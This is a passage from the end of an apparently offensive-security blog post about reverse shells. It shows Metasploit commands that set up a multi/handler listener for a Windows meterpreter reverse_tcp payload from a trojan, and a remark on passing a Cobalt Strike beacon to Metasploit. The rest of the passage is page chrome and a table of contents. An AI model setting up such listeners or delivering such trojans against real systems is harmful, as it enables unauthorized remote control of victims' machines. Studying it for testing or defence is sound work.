+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost msf_ip</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport msf_port</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></li>
+<li><p>When target triggers the trojan, we will get a <code>meterpreter</code> in Metasploit Framework.</p>
+</li>
+</ol>
+<p>If we have already got a <code>beacon</code>, we can spawn a foreign reverse shell, and deliver a <code>meterpreter</code>.</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/05/25/2020-05-25-About-Stealing-Credentials/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">About Stealing Credentials</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/03/18/2020-03-18-Collection-for-Package-Source/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Collection for Package Sources</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-Reverse-Shell"><span class="nav-number">1.</span> <span class="nav-text">Linux Reverse Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Descriptor"><span class="nav-number">1.1.</span> <span class="nav-text">File Descriptor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redirection"><span class="nav-number">1.2.</span> <span class="nav-text">Redirection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cases"><span class="nav-number">1.3.</span> <span class="nav-text">Cases</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netcat"><span class="nav-number">2.</span> <span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl"><span class="nav-number">3.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">4.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">5.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ruby"><span class="nav-number">6.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-number">7.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lua"><span class="nav-number">8.</span> <span class="nav-text">Lua</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter-amp-Beacon"><span class="nav-number">9.</span> <span class="nav-text">Meterpreter &amp; Beacon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF"><span class="nav-number">9.1.</span> <span class="nav-text">MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CS"><span class="nav-number">9.2.</span> <span class="nav-text">CS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Interoperability"><span class="nav-number">9.3.</span> <span class="nav-text">Interoperability</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#From-MSF-to-CS"><span class="nav-number">9.3.1.</span> <span class="nav-text">From MSF to CS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#From-CS-to-MSF"><span class="nav-number">9.3.2.</span> <span class="nav-text">From CS to MSF</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
